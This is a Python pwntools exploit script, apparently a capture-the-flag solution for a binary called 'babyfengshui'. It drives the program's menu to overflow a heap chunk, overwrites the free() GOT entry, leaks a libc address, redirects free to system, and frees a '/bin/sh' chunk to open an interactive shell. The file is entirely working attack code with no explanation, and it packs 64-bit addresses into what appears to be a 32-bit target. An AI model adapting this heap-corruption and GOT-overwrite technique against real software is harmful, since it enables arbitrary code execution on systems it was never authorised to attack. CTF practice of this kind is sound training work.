#!/usr/bin/python
from pwn import *

free_got= 0x804b010
offset=0xf75ebda0-0xf76222f0
class mypwn(object):
	def __init__(self):
		self.io=process("./babyfengshui")

	def new(self,data,name):
		self.io.recvuntil("Action: ")
		self.io.sendline("0")
		self.io.recvuntil("size of description: ")
		self.io.sendline(str(len(data)))
		self.io.recvuntil("name: ")
		self.io.sendline(name)
		self.io.recvuntil("text length:")
		self.io.sendline(str(len(data)))
		self.io.recvuntil("text: ")
		self.io.sendline(data)
		pass

	def delete(self,idx):
		self.io.recvuntil("Action: ")
		self.io.sendline("1")
		self.io.recvuntil("index: ")
		self.io.sendline(str(idx))

	def update(self,idx,data):
		self.io.recvuntil("Action: ")
		self.io.sendline("3")
		self.io.recvuntil("index: ")
		self.io.sendline(str(idx))
		self.io.recvuntil("text length: ")
		self.io.sendline(str(len(data)))
		self.io.recvuntil("text: ")
		self.io.sendline(data)

	def display(self,idx):
		self.io.recvuntil("Action: ")
		self.io.sendline("2")
		self.io.recvuntil("index: ")
		self.io.sendline(str(idx))

	def leak_libc(self):
		self.io.recvuntil("description: ")
		content=self.io.recvuntil("\n")[:-1]
		rate=1
		addr=0
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.free=addr&0xffffffff
		self.fgets=(addr-self.free)/0x100000000
		self.system=self.free+offset
		print hex(self.free)
		print hex(self.fgets)

	def debug(self):
		sc=''
		pwnlib.gdb.attach(self.io,sc)

	def exp(self):
		pass

	def run(self):
		self.new("aaa","aaa")
		self.new("aaa","aaa")
		self.delete(0)
		self.new("a"*0x80,"aaa")
		self.new("/bin/sh","/bin/sh")
		self.update(2,"a"*0x98+p64(free_got))
		self.display(1)
		self.leak_libc()
		self.update(1,p64(self.system))
		self.delete(3)
		#self.debug()
		self.io.interactive()
		pass

p=mypwn()
p.run()